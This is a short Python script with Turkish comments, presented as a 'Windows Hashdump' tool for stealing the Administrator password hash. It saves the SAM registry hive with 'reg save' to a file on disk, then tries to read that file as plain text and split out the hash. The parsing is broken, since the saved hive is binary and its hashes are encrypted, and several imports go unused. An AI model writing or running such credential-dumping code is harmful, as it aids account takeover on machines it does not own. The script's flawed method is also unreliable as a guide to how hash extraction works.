import os
import subprocess
import base64
import sys
import time
import logging
from win32com.shell import shell, shellcon

# Loglama ayarları
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

def get_admin_hash():
    """Windows SAM veritabanından admin parolasının hash'ini alır."""
    try:
        # SAM dosyasına erişim sağla
        logger.info("SAM dosyasına erişiliyor...")
        output = subprocess.check_output("reg save HKLM\\SAM C:\\sam_backup /y", shell=True)
        output = output.decode('utf-8')

        # Yedekleme başarılı mı kontrol et
        if 'successfully' in output:
            logger.info("[+] SAM veritabanı başarıyla yedeklendi.")
        else:
            logger.error("[-] SAM veritabanına erişilemiyor.")
            return None

        # Dosyayı açıp hash'leri alalım
        with open('C:\\sam_backup', 'r') as file:
            data = file.readlines()

        hashes = {}
        for line in data:
            if "Administrator" in line:  # Kullanıcı ismini değiştirebilirsiniz
                parts = line.split(":")
                hashes['Administrator'] = parts[1]  # Hash kısmını almak

        if hashes:
            return hashes
        else:
            logger.error("[-] Hashler bulunamadı.")
            return None

    except Exception as e:
        logger.error(f"[-] Hata: {e}")
        return None


def display_hashes(hashes):
    """Elde edilen hash'leri ekranda gösterir."""
    if hashes:
        for user, hash_value in hashes.items():
            logger.info(f"[+] {user} Kullanıcısının Hash'i: {hash_value}")
    else:
        logger.error("[-] Hash bilgisi alınamadı.")


def main():
    logger.info("[*] Windows Hashdump Başlatıldı...")
    hashes = get_admin_hash()
    display_hashes(hashes)

if __name__ == "__main__":
    main()